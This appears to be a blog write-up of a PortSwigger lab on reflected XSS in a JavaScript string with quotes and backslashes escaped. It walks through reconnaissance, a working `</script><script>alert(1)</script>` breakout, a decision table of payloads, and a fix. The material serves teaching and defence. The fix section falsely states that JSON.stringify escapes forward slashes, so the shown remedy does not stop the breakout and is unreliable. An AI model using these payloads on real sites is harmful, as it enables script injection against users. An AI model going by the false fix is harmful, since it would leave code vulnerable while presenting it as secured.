---
layout: post
title: "Reflected XSS into a JavaScript String with Single Quote and Backslash Escaped"
date: 2027-06-13 09:00:00 -0500
categories: [Web Security, XSS]
tags: [xss, javascript, portswigger, cwe-79, reflected-xss]
---

## Lab Overview

This PortSwigger Web Security Academy lab covers a reflected XSS where the developer added JS-level escaping to prevent the classic string breakout — but chose the wrong layer of protection. The key insight: HTML parsers run before JavaScript engines, and they scan for `</script>` as a raw byte sequence regardless of JS string escaping.

**Vulnerability:** Reflected Cross-Site Scripting (CWE-79)  
**Difficulty:** Practitioner  
**Status:** Solved

---

## Reconnaissance

The search functionality reflects user input into an inline JavaScript string:

```html
<script>
    var searchTerms = 'USER_INPUT';
    document.write('<img src="/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Probing the escaping behavior:

```
GET /?search=test'backslash\
```

Response: `var searchTerms = 'test\'backslash\\';`

Both single-quote (`'` → `\'`) and backslash (`\` → `\\`) are escaped. The developer anticipated the classic JS string breakout and patched it.

---

## The Vulnerability

Server-side JS string escaping operates at the JavaScript level. But HTML parsers process the document at a higher level — they scan the raw byte stream for `</script>` to determine where the script block ends, before any JavaScript is parsed.

This means:
- `\'` correctly prevents breaking the JS string literal
- `\\` correctly prevents prepending a backslash to escape the escape
- **Neither protection affects the HTML parser's byte-level scan**

---

## Exploitation

The payload operates at the HTML layer, not the JavaScript layer:

```
</script><script>alert(1)</script>
```

When reflected, the page contains:

```html
<script>
    var searchTerms = '</script><script>alert(1)</script>';
```

The HTML parser reads `</script>` and closes the first script block. It doesn't understand JS string literals — it's just scanning bytes. The `<script>alert(1)</script>` that follows is a fresh, valid script block that executes immediately.

The server's JS escaping (`\'`, `\\`) never gets a chance to matter because we never tried to break the JS string — we broke out at the HTML layer instead.

---

## Confirmation

```
ALERT_FIRED: True
is-solved
```

---

## Decision Tree: Injection Inside a `<script>` String

When input lands inside an inline script's string literal, three cases arise:

| Probe result | Vector |
|---|---|
| `'` appears raw | JS string break: `'-alert(1)-'` |
| `'` → `\'`, `\` → `\\` | HTML-level break: `</script><script>alert(1)</script>` |
| `<` → `&lt;` (angle brackets encoded) | HTML-level break blocked; only JS operators without quotes work |

---

## Fix

To prevent the HTML-level break, the server must also encode `<` and `>` in any value reflected into a script context. The reliable approach is `JSON.stringify`:

```javascript
// Vulnerable
var searchTerms = '<%= input %>';

// Fixed — JSON.stringify escapes slashes: </script> becomes <\/script>
var searchTerms = <%- JSON.stringify(input) %>;
```

`JSON.stringify` produces `"<\/script>"` — the forward slash is escaped, which the HTML parser cannot read as a closing script tag.

**CWE:** [CWE-79 — Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
